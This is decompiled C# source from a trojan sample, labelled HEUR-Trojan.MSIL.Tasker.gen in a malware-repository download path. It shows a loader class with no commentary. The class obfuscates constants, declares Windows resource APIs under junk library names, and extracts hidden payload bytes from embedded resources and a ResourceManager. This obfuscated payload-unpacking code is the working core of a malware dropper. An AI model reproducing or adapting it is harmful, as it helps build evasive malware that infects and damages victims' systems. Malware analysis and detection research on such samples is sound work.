// Decompiled with JetBrains decompiler
// Type: InsertHash
// Assembly: fecdjlmmFA, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9253BDD-5FA0-42F4-8B0E-70ACE2241470
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-2d4158772871be3f7e522bf37dfc01789234fceea5e08f3b779261cecd08c880.exe

using System;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal class InsertHash
{
  private static Task<int> BinaryCompatibility()
  {
    // ISSUE: variable of a compiler-generated type
    InsertHash.FullNameToken stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_IsNative = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.Newobj = Convert.ToInt32(2.0 * -40746.5) + Convert.ToInt32(80626.082973632554 - Math.Sin(40313.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) + Convert.ToInt32(374978.0 / 433.0) / \u003CModule\u003E.GREGORIAN(int.Parse("10"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_IsNative.Start<InsertHash.FullNameToken>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Get_IsNative.Task;
  }

  private static Task<int> M_Datastore()
  {
    // ISSUE: variable of a compiler-generated type
    InsertHash.LocalPop stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Enabled = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.IPermission = Convert.ToInt32(-74238.5 - 74238.5) + Convert.ToInt32(82070.321526289219 - Math.Sqrt(40934.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + Convert.ToInt32(66608.023725155392 + Math.Tan(33304.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Enabled.Start<InsertHash.LocalPop>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Enabled.Task;
  }

  private static Task<int> GetRuntimeType()
  {
    // ISSUE: variable of a compiler-generated type
    InsertHash.GetRootElementType stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_AllYearMonthPatterns = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.VT_VECTOR = Convert.ToInt32(2.0 * -28073.0) + Convert.ToInt32(5200.8139337935427 - Math.Tan(2603.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) + Convert.ToInt32(76408.5 - 25469.5) / \u003CModule\u003E.GREGORIAN(int.Parse("11"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_AllYearMonthPatterns.Start<InsertHash.GetRootElementType>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Get_AllYearMonthPatterns.Task;
  }

  private static Task<int> LookForMe()
  {
    // ISSUE: variable of a compiler-generated type
    InsertHash.SetLastAccessTimeUtc stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_Cache = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.SystemWebDynamicDataDesign = (int.Parse("-319369714") ^ int.Parse("319387230")) + Convert.ToInt32(52377.224721029088 + Math.Cos(26189.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) - Convert.ToInt32(17014.0 + Math.Truncate(17013.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_Cache.Start<InsertHash.SetLastAccessTimeUtc>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Get_Cache.Task;
  }

  public static void WriteUTF8String()
  {
    Task<int> task = \u003CModule\u003E.\u0090\u00AE\u0021ê\u00AF();
    \u003CModule\u003E.\u0012àLú\u003F("Taikkkkkkkkkkkiuiiokkkkkkkkkkd");
    string str1 = \u003CModule\u003E.\u002A\u008DË\u008E\u00AE();
    \u003CModule\u003E.\u0012àLú\u003F(\u003CModule\u003E.\u003EáTK\u002A("The flow of the program is resumed once the task is completed by the asynchronous method and the value is returned ", str1));
    \u003CModule\u003E.\u0012àLú\u003F("The programl file to count the number of characters in the file");
    int result = task.Result;
    string str2 = \u003CModule\u003E.\u002A\u008DË\u008E\u00AE();
  }

  [DllImport("kgdffsdfsdfsdfsdfsdgdff#", EntryPoint = "fgfsdfsdfdsffdfgfda", SetLastError = true)]
  private static extern IntPtr Stack`1(IntPtr _param0, IntPtr _param1);

  [DllImport("#fdsf#", EntryPoint = "LoadResource")]
  private static extern IntPtr ISymUnmanagedDocument(IntPtr _param0, IntPtr _param1);

  [DllImport("#dsd.dll#", EntryPoint = "GetModuleHandle", SetLastError = true)]
  private static extern IntPtr _userCallback(string _param0);

  [DllImport("#dgsdsdgfg.dpolpll#", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr SetGenParamCustomAttributeNoLock(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#fdsdd.pdll#", EntryPoint = "dg")]
  private static extern IntPtr Sunday(string _param0);

  [DllImport("#fsdfsdsddgd#", EntryPoint = "gshfdfdsdsdfdsdlkolfsdfgsdg", SetLastError = true)]
  private static extern IntPtr AdjustPrivileges(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#gfsddsfd.dll#", EntryPoint = "gshfsddfpfdhddgdsg")]
  private static extern IntPtr ShowMessageBox(string _param0);

  [DllImport("#gfssddff.dll#", EntryPoint = "drdseg")]
  private static extern IntPtr ThreadStateException(string _param0);

  [DllImport("#gdsdsdfsdfdssgdhfdggggggdkksg.dll#", EntryPoint = "gddgldsgsdsdfhsg")]
  private static extern IntPtr InternalGetReference(string _param0);

  [DllImport("#gsfhsdfsdsdfgsdgdgsdgf;ddg.dll#", EntryPoint = "SizeofResource", SetLastError = true)]
  private static extern uint Documents(IntPtr _param0, IntPtr _param1);

  [DllImport("#gsdfgsdfddsdfgfgsd.dll#", EntryPoint = "fsdddf", SetLastError = true)]
  private static extern IntPtr NotImplemented(IntPtr _param0, string _param1, string _param2);

  public static byte[] S_CONSTANT_16t(string _param0, string _param1)
  {
    IntPtr num1 = \u003CModule\u003E.\u0097\u0087TZÂ(\u003CModule\u003E.ÏMNqÀ(\u003CModule\u003E.\u00B7lo\u007Dÿ()));
    IntPtr num2 = \u003CModule\u003E.o2\u00ACE\u00B8(num1, _param0, _param1);
    IntPtr num3 = \u003CModule\u003E.\u00A1Vs\u00B7\u0096(num1, num2);
    uint length = \u003CModule\u003E.\u0060\u0004\u0023Ù\u005C(num1, num2);
    byte[] numArray = new byte[(IntPtr) length];
    \u003CModule\u003E.uÓ\u00A2\u00AFü(num3, numArray, Convert.ToInt32(2.0 * -12493.0) + Convert.ToInt32(33903.0 - Math.Abs(11301.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(2385.0 - Math.Tanh(1192.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length, (int) length);
    return numArray;
  }

  public static byte[] M_ILStream(string _param0, string _param1)
  {
    ResourceManager resourceManager = (ResourceManager) \u003CModule\u003E.\u0095\u001BOå\u002C(_param1, \u003CModule\u003E.\u00B7lo\u007Dÿ());
    return (byte[]) \u003CModule\u003E.\u0084\u00B9ÂÙ\u0011((object) resourceManager, _param0);
  }
}
